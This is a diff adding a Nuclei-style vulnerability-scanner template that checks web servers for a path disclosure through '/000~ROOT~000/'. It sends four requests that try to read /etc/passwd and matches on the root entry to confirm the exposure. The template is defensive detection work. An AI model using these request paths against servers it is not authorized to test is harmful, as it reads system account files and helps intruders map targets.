@@ -1,0 +1,38 @@
+id: root-path-disclosure
+
+info:
+  name: ROOT - Path Disclosure
+  author: soltanali0,ArganexEmad
+  severity: high
+  description: |
+    Detects potential exposure of sensitive file paths like /000~ROOT~000/.
+  metadata:
+    verified: true
+    max-request: 4
+  tags: misconfig,exposure,info-leak,listing,lfr
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/home/000~ROOT~000/etc/passwd"
+      - "{{BaseURL}}/000~ROOT~000/etc/passwd"
+      - "{{BaseURL}}/OLDS/home/000~ROOT~000/etc/passwd"
+      - "{{BaseURL}}/app/webroot/files/kcfinder/files/home/000~ROOT~000/etc/passwd"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "^root:.*:0:0:"
+
+      - type: regex
+        part: accept_ranges
+        regex:
+          - "bytes"
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221009b4e9101d1f7d2ca2655255b58fa8200358289497f1a6093cb49884816de63b6022100f2a74c6c7829b157266e4cd4ddd96d1cffdc08ab963db579b0d18b3697d16919:922c64590222798bb761d5b6d8e72950
